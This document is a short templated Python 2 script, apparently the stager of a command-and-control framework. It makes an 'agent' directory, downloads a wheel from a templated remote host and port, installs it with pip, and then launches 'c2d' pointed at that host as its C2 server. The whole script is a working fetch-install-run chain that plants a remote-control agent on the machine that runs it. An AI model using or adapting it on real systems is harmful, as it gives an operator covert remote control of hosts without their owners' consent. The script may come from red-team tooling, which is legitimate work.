import os, urllib, pip, re, subprocess


def install(package):
    pip.main(['install', package])


if __name__ == "__main__":
    install('wheel')

    try:
        os.mkdir('agent')
    except Exception, e:
        print e

    os.chdir('agent')
    if {{ ssl }}:
        url = "https://{{hostname}}:{{port}}/latest"
    else:
        url = "http://{{hostname}}:{{port}}/latest"

    filename = re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0]
    whl = urllib.urlretrieve(url, filename)
    install(filename)
    print '[+] Install succesfull, configuring host'
    host = '{{hostname}}'.split(':')[0]
    if {{ ssl }}:
        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '{{port}}', '--ssl'])
    else:
        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '{{port}}'])


